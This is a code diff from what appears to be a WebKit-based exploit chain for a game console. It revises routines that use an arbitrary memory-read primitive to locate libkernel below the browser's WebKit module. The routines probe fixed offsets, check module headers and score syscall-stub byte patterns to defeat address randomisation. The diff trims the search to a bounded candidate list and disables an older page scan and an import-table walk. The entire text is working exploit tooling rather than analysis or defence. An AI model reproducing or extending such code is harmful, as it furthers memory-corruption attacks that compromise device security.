@@ -2211,72 +2211,39 @@ export function resolveExtModuleHunt(p, fnPtr, webkitBase, off, maxPages) {
     return d.hit || null;
 }
 
-/** Fixed offsets below webkit — 1 read each, no linear unmapped scan. */
+/** ≤3 reads — hunt-only stub spot check. */
+function microStubScore(p, base) {
+    let stubs = 0;
+    const offs = [0x1000, 0x9000, 0x15000];
+    for (let i = 0; i < offs.length; i++) {
+        const w = read4p(p, base.add32(offs[i]));
+        if (w != null && (w & 0xffffff) === 0xc0c748) stubs++;
+    }
+    return stubs;
+}
+
+/** Fixed offsets below webkit — 1 SCE peek each, ≤24 reads total. */
 export function huntLibkernelCandidatesChunk(p, webkitBase, off, state, opts) {
     opts = opts || {};
+    const readMax = opts.readMax != null ? opts.readMax : 24;
     if (!p || !webkitBase)
         return { done: true, ok: false, phase: "cand-skip" };
 
     if (!state) {
         const wb = ptrBig(webkitBase) & ~0x3fffn;
         const deltas = [
-            0x400000, 0x800000, 0x1000000, 0x1400000, 0x1800000,
-            0x2000000, 0x2800000, 0x3000000,
+            0x400000, 0x800000, 0x1000000, 0x1800000,
+            0x2000000, 0x2800000, 0x3000000, 0x3800000,
         ];
         const addrs = [];
         for (let i = 0; i < deltas.length; i++)
             addrs.push({ hex: "0x" + (wb - BigInt(deltas[i])).toString(16), why: "wk-" + deltas[i].toString(16) });
-        state = { addrs, idx: 0, probed: 0, nulls: 0 };
-        return { done: false, state, phase: "cand-start", total: addrs.length };
+        state = { addrs, idx: 0, reads: 0, nulls: 0 };
+        return { done: false, state, phase: "cand-start", total: addrs.length, readMax };
     }
 
-    const batchMax = opts.candBatch != null ? opts.candBatch : 2;
-    let batch = 0;
-    while (state.idx < state.addrs.length && batch < batchMax) {
-        const c = state.addrs[state.idx++];
-        batch++;
-        state.probed++;
-        let addr;
-        try {
-            addr = parseAddrSync(c.hex.replace(/^0x/i, ""));
-        } catch (_) {
-            addr = null;
-        }
-        if (!addr) continue;
-        const magic = read4p(p, addr);
-        if (magic == null) {
-            state.nulls++;
-            continue;
-        }
-        if (!isModuleMagic(magic) || isSameWebkitModule(addr, webkitBase, off)) continue;
-        const stubs = liteSyscallStubScore(p, addr);
-        if (stubs >= 2) {
-            saveLibkernelSession(addr, null);
-            return {
-                done: true,
-                ok: true,
-                lk: addr,
-                stubs,
-                source: "hunt-cand+" + c.why,
-                state,
-                phase: "cand-hit",
-                tried: state.probed,
-            };
-        }
-        if (stubs >= 1 && checkPrologueAt(p, addr)) {
-            saveLibkernelSession(addr, null);
-            return {
-                done: true,
-                ok: true,
-                lk: addr,
-                stubs,
-                weak: true,
-                source: "hunt-cand-weak+" + c.why,
-                state,
-                phase: "cand-hit",
-                tried: state.probed,
-            };
-        }
+    if (state.reads >= readMax) {
+        return { done: true, ok: false, state, phase: "cand-budget", reads: state.reads };
     }
 
     if (state.idx >= state.addrs.length) {
@@ -2285,233 +2252,61 @@ export function huntLibkernelCandidatesChunk(p, webkitBase, off, state, opts) {
             ok: false,
             state,
             phase: "cand-miss",
-            tried: state.probed,
+            reads: state.reads,
             nulls: state.nulls,
         };
     }
 
-    return {
-        done: false,
-        state,
-        phase: "cand",
-        tried: state.probed,
-        total: state.addrs.length,
-    };
-}
-
-/** Short scan below webkit — aborts on null cliff (unmapped reads OOM on HW). */
-export function huntLibkernelBelowWebkitChunk(p, webkitBase, off, state, opts) {
-    opts = opts || {};
-    const step = 0x4000n;
-    const maxPages = opts.maxPages != null ? opts.maxPages : 48;
-    const batchN = opts.batchPages != null ? opts.batchPages : 2;
-    const nullMax = opts.nullMax != null ? opts.nullMax : 8;
-
-    if (!p || !webkitBase)
-        return { done: true, ok: false, error: "no webkitBase", phase: "hunt-skip" };
-
-    if (!state) {
-        const wb = ptrBig(webkitBase) & ~0x3fffn;
-        const end = wb > BigInt(maxPages) * step ? wb - BigInt(maxPages) * step : 0n;
-        state = {
-            wb,
-            cursor: wb - step,
-            end,
-            pages: 0,
-            reads: 0,
-            nullRun: 0,
-            modules: 0,
-            best: null,
-        };
-        return {
-            done: false,
-            state,
-            phase: "hunt-start",
-            wk: String(webkitBase),
-            maxPages,
-        };
+    const c = state.addrs[state.idx++];
+    state.reads++;
+    let addr;
+    try {
+        addr = parseAddrSync(c.hex.replace(/^0x/i, ""));
+    } catch (_) {
+        addr = null;
+    }
+    if (!addr) {
+        return { done: false, state, phase: "cand", idx: state.idx, reads: state.reads };
     }
 
-    let batch = 0;
-    while (state.cursor > state.end && batch < batchN && state.pages < maxPages) {
-        const addr = bigToPtr(state.cursor);
-        state.cursor -= step;
-        state.pages++;
-        batch++;
-        if (!addr || addr.hi < 0x8 || (addr.low & 0x3fff) !== 0) continue;
-        state.reads++;
-        const magic = read4p(p, addr);
-        if (magic == null) {
-            state.nullRun++;
-            if (state.nullRun >= nullMax) {
-                return {
-                    done: true,
-                    ok: false,
-                    state,
-                    phase: "hunt-null-cliff",
-                    pages: state.pages,
-                    reads: state.reads,
-                    modules: state.modules,
-                    nullRun: state.nullRun,
-                };
-            }
-            continue;
-        }
-        state.nullRun = 0;
-        if (!isModuleMagic(magic) || isSameWebkitModule(addr, webkitBase, off)) continue;
-        state.modules++;
-        const stubs = liteSyscallStubScore(p, addr);
-        if (!state.best || stubs > state.best.stubs)
-            state.best = { lk: addr, stubs, magic: magic >>> 0 };
-        if (stubs >= 2) {
-            saveLibkernelSession(addr, null);
-            return {
-                done: true,
-                ok: true,
-                lk: addr,
-                stubs,
-                source: "hunt-below-wk",
-                state,
-                phase: "hunt-hit",
-                pages: state.pages,
-                reads: state.reads,
-                modules: state.modules,
-            };
-        }
+    const magic = read4p(p, addr);
+    if (magic == null) {
+        state.nulls++;
+        return { done: false, state, phase: "cand", idx: state.idx, reads: state.reads, at: c.why };
+    }
+    if (!isModuleMagic(magic) || isSameWebkitModule(addr, webkitBase, off)) {
+        return { done: false, state, phase: "cand", idx: state.idx, reads: state.reads, at: c.why };
     }
 
-    if (state.cursor <= state.end || state.pages >= maxPages) {
-        if (state.best && state.best.stubs >= 1) {
-            saveLibkernelSession(state.best.lk, null);
-            return {
-                done: true,
-                ok: true,
-                lk: state.best.lk,
-                stubs: state.best.stubs,
-                weak: true,
-                source: "hunt-below-best",
-                state,
-                phase: "hunt-best",
-                pages: state.pages,
-                reads: state.reads,
-                modules: state.modules,
-            };
-        }
+    state.reads += 3;
+    const stubs = microStubScore(p, addr);
+    if (stubs >= 1) {
+        saveLibkernelSession(addr, null);
         return {
             done: true,
-            ok: false,
+            ok: true,
+            lk: addr,
+            stubs,
+            source: "hunt-cand+" + c.why,
             state,
-            phase: "hunt-miss",
-            pages: state.pages,
+            phase: "cand-hit",
             reads: state.reads,
-            modules: state.modules,
         };
     }
 
-    return {
-        done: false,
-        state,
-        phase: "hunt",
-        pages: state.pages,
-        reads: state.reads,
-        modules: state.modules,
-    };
+    return { done: false, state, phase: "cand", idx: state.idx, reads: state.reads, at: c.why };
 }
 
-/** Poops RELRO import slots @ webkit+RVA → module stub score (uses webkitBase only). */
+/** @deprecated linear below scan OOMs — use huntLibkernelCandidatesChunk */
+export function huntLibkernelBelowWebkitChunk(p, webkitBase, off, state, opts) {
+    if (!state)
+        return { done: true, ok: false, phase: "hunt-skip", error: "disabled" };
+    return { done: true, ok: false, state, phase: "hunt-miss", reads: 0, modules: 0 };
+}
+
+/** @deprecated RELRO walk OOMs — collect ext ptrs in Scan GOT lite instead */
 export function scanPoopsImportChunk(p, webkitBase, off, state, opts) {
-    opts = opts || {};
-    if (!p || !webkitBase)
-        return { done: true, ok: false, phase: "imp-skip" };
-
-    if (!state) {
-        const w0 = read4p(p, webkitBase);
-        const ranges = (w0 === POOPS_TEXT_MAGIC || isPoopsTextBase(p, webkitBase))
-            ? poopsRelroRanges(off, true) : [];
-        if (!ranges.length)
-            return { done: true, ok: false, phase: "imp-skip", error: "no poops RELRO" };
-        const base = moduleLoadBase(p, webkitBase);
-        state = {
-            loadBase: base,
-            ranges,
-            rangeIdx: 0,
-            cursor: ranges[0].lo,
-            endRva: ranges[0].hi,
-            tried: 0,
-            best: null,
-        };
-        return {
-            done: false,
-            state,
-            phase: "imp-start",
-            span: ranges.map(function (r) {
-                return r.tag + ":0x" + r.lo.toString(16);
-            }).join(" "),
-        };
-    }
-
-    const batchMax = opts.impBatch != null ? opts.impBatch : 4;
-    const walkPages = opts.impWalkPages != null ? opts.impWalkPages : 12;
-    let batch = 0;
-    while (state.cursor < state.endRva && batch < batchMax) {
-        const rva = state.cursor;
-        state.cursor += 8;
-        state.tried++;
-        batch++;
-        const fnPtr = read8p(p, state.loadBase.add32(rva));
-        if (!fnPtr || !plausibleExtPtr(fnPtr, state.loadBase, off)) continue;
-        const hdr = findModuleBaseBeforeCode(p, fnPtr, webkitBase, off, walkPages);
-        if (!hdr) continue;
-        const stubs = liteSyscallStubScore(p, hdr);
-        if (!state.best || stubs > state.best.stubs)
-            state.best = { lk: hdr, stubs, rva, fn: String(fnPtr) };
-        if (stubs >= 2) {
-            saveLibkernelSession(hdr, null);
-            return {
-                done: true,
-                ok: true,
-                lk: hdr,
-                stubs,
-                source: "poops-imp+" + rva.toString(16),
-                state,
-                phase: "imp-hit",
-                tried: state.tried,
-            };
-        }
-    }
-
-    if (state.cursor >= state.endRva) {
-        const next = state.rangeIdx + 1;
-        if (next < state.ranges.length) {
-            state.rangeIdx = next;
-            state.cursor = state.ranges[next].lo;
-            state.endRva = state.ranges[next].hi;
-            return { done: false, state, phase: "imp-region", tried: state.tried };
-        }
-        if (state.best && state.best.stubs >= 1) {
-            saveLibkernelSession(state.best.lk, null);
-            return {
-                done: true,
-                ok: true,
-                lk: state.best.lk,
-                stubs: state.best.stubs,
-                weak: true,
-                source: "poops-imp-best+" + state.best.rva.toString(16),
-                state,
-                phase: "imp-best",
-                tried: state.tried,
-            };
-        }
-        return { done: true, ok: false, state, phase: "imp-miss", tried: state.tried };
-    }
-
-    return {
-        done: false,
-        state,
-        phase: "imp",
-        cursor: state.cursor,
-        tried: state.tried,
-    };
+    return { done: true, ok: false, phase: "imp-skip", error: "disabled" };
 }
 
 function addrFromNum(n) {
